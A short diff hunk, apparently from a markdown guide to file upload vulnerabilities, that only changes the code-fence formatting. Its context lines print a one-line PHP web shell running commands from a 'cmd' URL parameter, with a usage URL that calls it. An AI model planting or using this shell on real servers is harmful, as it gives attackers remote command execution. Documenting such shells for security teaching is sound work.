@@ -17,9 +17,9 @@ File upload vulnerabilities arise when a server improperly handles user-uploaded
 - **Bypass:** No need for bypass; just upload a web shell.
 
 ### **Example: Basic PHP Web Shell**
-```php
+`php
 <?php system($_GET['cmd']); ?>
-```
+`
 **Usage:** `http://example.com/uploads/shell.php?cmd=id`
 
 ---
